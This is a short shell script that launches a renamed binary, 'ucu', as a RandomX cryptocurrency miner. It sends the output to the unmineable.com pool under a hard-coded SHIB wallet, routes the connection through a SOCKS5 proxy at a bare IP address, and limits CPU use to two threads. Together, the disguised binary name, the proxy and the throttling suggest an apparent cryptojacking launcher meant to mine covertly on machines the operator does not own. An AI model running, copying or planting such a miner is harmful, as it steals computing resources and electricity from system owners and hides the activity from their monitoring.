#!/bin/sh
chmod +x ucu
./ucu --disable-gpu --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet SHIB:0xc47ac4f4bb1e94f545738b2b8043bdfd711deaeb --worker MEGALOMAN --disable-msr-tweaks --keepalive value true --cpu-threads 2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455
